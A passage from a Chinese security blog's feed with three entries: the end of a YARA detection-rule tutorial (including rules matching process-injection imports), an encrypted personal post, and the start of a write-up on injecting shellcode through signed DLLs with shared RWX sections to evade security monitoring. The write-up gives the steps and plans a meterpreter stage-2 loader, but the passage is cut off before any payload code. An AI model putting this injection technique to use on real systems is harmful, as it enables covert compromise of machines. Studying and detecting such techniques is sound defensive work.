class="line">&#125;</span><br></pre></td></tr></table></figure><p>string类型的外部变量可以与以下运算符一起使用：contains、startswith、endswith及其不区分大小写的对应运算符：icontains、istartswith和iendswith`。它们还可以与“matches运算符一起使用，如果字符串与给定的正则表达式匹配，则返回true。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">rule ContainsExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var contains <span class="string">"text"</span></span><br><span class="line">&#125;</span><br><span class="line">rule CaseInsensitiveContainsExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var icontains <span class="string">"text"</span></span><br><span class="line">&#125;</span><br><span class="line">rule StartsWithExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var startswith <span class="string">"prefix"</span></span><br><span class="line">&#125;</span><br><span class="line">rule EndsWithExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var endswith <span class="string">"suffix"</span></span><br><span class="line">&#125;</span><br><span class="line">rule MatchesExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var matches /[a-z]+/is</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="偏门模块"><a href="#偏门模块" class="headerlink" title="偏门模块"></a>偏门模块</h2><ol><li>Hash模块</li></ol><p><a href="https://yara.readthedocs.io/en/latest/modules/hash.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/hash.html</a></p><ol start="2"><li>Math模块</li></ol><p><a href="https://yara.readthedocs.io/en/latest/modules/math.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/math.html</a></p><ol start="3"><li>Dotnet 模块</li></ol><p><a href="https://yara.readthedocs.io/en/latest/modules/dotnet.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/dotnet.html</a></p><h2 id="一些进阶用法"><a href="#一些进阶用法" class="headerlink" title="一些进阶用法"></a>一些进阶用法</h2><h3 id="打分"><a href="#打分" class="headerlink" title="打分"></a>打分</h3><p>利用yara的math模块进行打分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.to_number(SubRule1) * 60 + math.to_number(SubRule2) * 20 + math.to_number(SubRule3) * 70 &gt; 80</span><br></pre></td></tr></table></figure><h3 id="判断-text-section的墒值在7-4与7-6之间"><a href="#判断-text-section的墒值在7-4与7-6之间" class="headerlink" title="判断.text section的墒值在7.4与7.6之间"></a>判断.text section的墒值在7.4与7.6之间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> any section <span class="keyword">in</span> pe.sections : ( </span><br><span class="line">section.name == <span class="string">".text"</span> </span><br><span class="line">and  math.in_range(math.entropy(section.raw_data_offset,section.raw_data_size),7.4,7.6))</span><br></pre></td></tr></table></figure><h3 id="导入表有且仅有VirtualAlloc-和-CreateRemoteThread-以及-WriteProcessMemory"><a href="#导入表有且仅有VirtualAlloc-和-CreateRemoteThread-以及-WriteProcessMemory" class="headerlink" title="导入表有且仅有VirtualAlloc 和 CreateRemoteThread 以及 _WriteProcessMemory_"></a>导入表有且仅有<code>VirtualAlloc</code> 和 <code>CreateRemoteThread</code> 以及 <code>_WriteProcessMemory_</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"VirtualAlloc"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"CreateRemoteThread"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"WriteProcessMemory"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>)  == 3</span><br></pre></td></tr></table></figure><h3 id="有某个图标，并且无签名-不够灵活，没法设定一个hash列表"><a href="#有某个图标，并且无签名-不够灵活，没法设定一个hash列表" class="headerlink" title="有某个图标，并且无签名(不够灵活，没法设定一个hash列表)"></a>有某个图标，并且无签名(不够灵活，没法设定一个hash列表)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">"hash"</span></span><br><span class="line">import <span class="string">"pe"</span></span><br><span class="line"></span><br><span class="line">rule iconForge&#123;</span><br><span class="line"></span><br><span class="line">   condition:</span><br><span class="line">    <span class="keyword">for</span> any res <span class="keyword">in</span> pe.resources: (</span><br><span class="line">          res.type == pe.RESOURCE_TYPE_ICON</span><br><span class="line">            hash.md5( res.offset,res.length) == <span class="string">"xxxxx"</span></span><br><span class="line">            ) </span><br><span class="line">        and </span><br><span class="line">            pe.number_of_signatures == 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="匹配PDB路径"><a href="#匹配PDB路径" class="headerlink" title="匹配PDB路径"></a>匹配PDB路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe.pdb_path icontains <span class="string">"shellcode"</span> or pe.pdb icontains <span class="string">"qianxin"</span></span><br></pre></td></tr></table></figure><h3 id="匹配特征在具体的节区"><a href="#匹配特征在具体的节区" class="headerlink" title="匹配特征在具体的节区"></a>匹配特征在具体的节区</h3><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> "pe"</span><br><span class="line"><span class="keyword">import</span> "console"</span><br><span class="line"></span><br><span class="line">rule test&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">strings</span>:</span><br><span class="line">        $a = &#123;55 8B EC F6 45 08 01 56 8B F1 C7 06 94 1F 43 00&#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (</span><br><span class="line">            pe<span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_offset</span>.<span class="variable">.pe</span><span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_offset</span>+pe<span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_size</span></span><br><span class="line">        )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;具备检测相关经验的同学可能都对yara匹配引擎比较熟悉了，看雪论坛上也有非常详细的翻译文章 - &lt;a href=&quot;https://bbs.kanxue.com/thread-226011.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;编写Yara规则检测恶意软件&lt;/a&gt;&lt;br&gt;本文主要对yara文档容易被忽略的部分进行了翻译和总结，并且给出一些进阶用法的例子，提高对yara匹配引擎语法的理解程度。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="blue &amp; red" scheme="http://blog.wonderkun.cc/tags/blue-red/"/>
    
  </entry>
  
  <entry>
    <title>社会学角度看恋爱关系</title>
    <link href="http://blog.wonderkun.cc/2022/12/23/%E7%A4%BE%E4%BC%9A%E5%AD%A6%E8%A7%92%E5%BA%A6%E7%9C%8B%E6%81%8B%E7%88%B1%E5%85%B3%E7%B3%BB/"/>
    <id>http://blog.wonderkun.cc/2022/12/23/社会学角度看恋爱关系/</id>
    <published>2022-12-23T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="心理学" scheme="http://blog.wonderkun.cc/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"/>
    
      <category term="脱单" scheme="http://blog.wonderkun.cc/tags/%E8%84%B1%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>滥用具备RWX-S权限且有签名的dll进行无感知的shellcode注入</title>
    <link href="http://blog.wonderkun.cc/2022/04/16/%E6%BB%A5%E7%94%A8%E5%85%B7%E5%A4%87RWX-S%E6%9D%83%E9%99%90%E4%B8%94%E6%9C%89%E7%AD%BE%E5%90%8D%E7%9A%84dll%E8%BF%9B%E8%A1%8C%E6%97%A0%E6%84%9F%E7%9F%A5%E7%9A%84shellcode%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.wonderkun.cc/2022/04/16/滥用具备RWX-S权限且有签名的dll进行无感知的shellcode注入/</id>
    <published>2022-04-16T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>常规的shellcode注入一般是通过<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code> 和 <code>CreateRemoteThread</code> 来实现的，但是这种方式是被安全软件重点监控的，同时微软提供的ETW接口也是可以轻易检测出上述方式进行代码注入的痕迹。本文的核心是讲解怎么利用具备 RWX-S 权限且自身有签名的白DLL进行一种比较隐蔽的shellcode注入，<br>并讲解具体的代码实现以及在写代码实现的过程中遇到的坑。本方法是由文章提出的：<a href="https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/" target="_blank" rel="noopener">https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/</a> ，详情可以参考此文章。</p><p>我的知识星球开启内测了，用微信扫描下面的小程序就可以免费加入，来和我一起学习安全技术。(在圈子内可以下载到源代码)</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204272138408.png" alt=""></p><a id="more"></a><h2 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h2><p>PE文件的每个section都具备自己的权限，表明他被映射到虚拟内存之后的操作权限，也就是 <code>SECTION_CHARACTERISTICS</code> 这个字段，占四个字节。<br>通常来讲 <code>.text</code> 节区只具备 <code>IMAGE_SCN_MEM_READ</code> 和 <code>IMAGE_SCN_MEM_EXECUTE</code> 权限，<code>.data</code> 节区一般只具备 <code>IMAGE_SCN_MEM_READ</code>,<code>IMAGE_SCN_MEM_WRITE</code> 权限。 当PE文件被映射到内存后，对一个不具备 <code>IMAGE_SCN_MEM_WRITE</code> 权限的节区进行写操作或者对一个没有 <code>IMAGE_SCN_MEM_EXECUTE</code> 的节区进行执行时，都会报异常。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204181752550.png" alt=""></p><p>看微软的文档：<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags" target="_blank" rel="noopener">document</a>, 会发现一个权限叫做 <code>IMAGE_SCN_MEM_SHARED</code>。 那共享到底意味着什么？据测试显示：<strong>具备此权限的section会被当前系统所有的进程共享，如果进程A和进程B都加载了具备IMAGE_SCN_MEM_SHARED权限的模块C，那么模块C的此section在系统层面上只有一份，这也就意味着A进程对C的修改（有IMAGE_SCN_MEM_WRITE权限）会影响到B进程</strong></p><p>那么思路就来了，如果一个模块的某个节区是具备 <code>RWX-S</code> 权限，我只需要把它加载到进程A中，然后修改它的内容为恶意代码，然后想办法让他加载到进程B中，就可以实现在B中执行恶意代码了， 那这种利用主要分为如下几个步骤：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 找到一个有签名的并且具备 RWX-S 权限的dll。(不具备RWX-S权限也可以，可以patch系统内的已签名的dll，但是这样会破坏签名，不够隐蔽)</span><br><span class="line"><span class="number">2.</span> 将DLL加载到进程A的内存里，修改 RWX-S 权限的section的代码进行patch</span><br><span class="line"><span class="number">3.</span> 调用  SetWindowsHookEx，使用DLL中的某个函数指针作为 HOOKPROC 参数，使得DLL被注入到目标进程B中。</span><br><span class="line"><span class="number">4.</span> 目标进程B加载DLL，并触发恶意代码执行。</span><br></pre></td></tr></table></figure><p>至于怎么去找一个具备 RWX-S权限的签名dll，原文作者也提供了一个yara规则在virustotal上来筛选，不再细说:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">"pe"</span></span><br><span class="line"></span><br><span class="line">rule RWX_S_Signed_Search</span><br><span class="line">&#123;</span><br><span class="line">meta:</span><br><span class="line">description = <span class="string">"Detects RWX-S signed binaries. This only verifies that the image contains a signature, not that it is valid."</span></span><br><span class="line">author = <span class="string">"Bill Demirkapi"</span></span><br><span class="line">condition:</span><br><span class="line"><span class="keyword">for</span> any <span class="selector-tag">i</span> <span class="keyword">in</span> (<span class="number">0</span>.<span class="selector-class">.pe</span><span class="selector-class">.number_of_sections</span> - <span class="number">1</span>): (</span><br><span class="line">(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_READ) and</span><br><span class="line">(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_EXECUTE) and</span><br><span class="line">(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_WRITE) and</span><br><span class="line">(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_SHARED) )</span><br><span class="line">and pe<span class="selector-class">.number_of_signatures</span> &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提供一个我找到的DLL: <a href="https://www.virustotal.com/gui/file/855277c0aeea89d17a07e27e9cf79c98b26e70e8e57561c4b592097e0032c4e9，" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/855277c0aeea89d17a07e27e9cf79c98b26e70e8e57561c4b592097e0032c4e9，</a><br>以后的代码都是基于此DLL完成的。</p><p>其实这里面最关键的是步骤二，主要涉及两个问题：</p><ol><li>patch什么位置可以保证此DLL被进程B加载之后，恶意代码一定会被执行</li><li>patch成什么样的代码才能保证进程B不会因为运行异常而崩溃</li></ol><p>先回答问题1：当前DLL被进程B加载后一定会被执行的有两个函数，分别是 <code>DllMain</code> 和 设置给 <code>SetWindowsHookEx</code> 的消息hook函数, 我觉得这两个函数中<code>DllMain</code>更合适被patch为恶意代码，理由是 <code>hook procedure</code> 在每次有对应消息需要处理的时候都会被调用，这会导致我们的恶意代码被执行很多次，这显然不是我们想要的。同时 <code>DllMain</code> 在被进程加载的那一刻就会执行，能够保证我们的shellcode在第一时间被执行。</p><h2 id="patch-DllMain为恶意代码"><a href="#patch-DllMain为恶意代码" class="headerlink" title="patch DllMain为恶意代码"></a>patch DllMain为恶意代码</h2><p>此时就有人说了，patch DllMain很简单啊，加载这个dll之后，获取 imagebase，然后解析PE头找到entrypoint，将 msfvenom 生成的shellcode直接复制 imagebase + entrypoint 的位置就可以了。 开始我也是这么认为的，但是事实证明，这样不行。</p><p>我们来看 DllMain的函数声明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved )</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Perform actions based on the reason for calling.</span></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">         <span class="comment">// Initialize once for each new process.</span></span><br><span class="line">         <span class="comment">// Return FALSE to fail DLL load.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">         <span class="comment">// Do thread-specific initialization.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">         <span class="comment">// Do thread-specific cleanup.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">         <span class="comment">// Perform any necessary cleanup.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函是有返回值的，当对应的 <code>fdwReason</code> 操作成功后，必须返回 TRUE/FALSE。 此函数直接被替换为 meterpreter 的 shellcode，就会导致此函数无法返回。这种情况下的DLL加载是在系统新开的一个线程中完成的，如果 <code>DllMain</code> 回调函数不返回，系统就会kill掉这个线程，以至于我们自己的恶意代码无法持续的执行，那解决办法就是要在 <code>DllMain</code> 中新开一个线程，在线程里执行恶意代码，然后此函数返回。</p><p><strong>由于这一段代码需要在B进程的进程空间中执行，此时没有任何地址相关的信息，所以这一段代码必须要写成shellcode才能正常执行</strong><br>由于要自己写一段shellcode，那我们就没有必要再去使用 <code>meterpreter</code> 的shellcode了，也就是说这一段代码要完成 <code>meterpreter</code> 第一阶段的功能，直接下载stage2 的代码，然后使用 <code>CreateThread</code>进行执行，所以基本的代码框架：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE 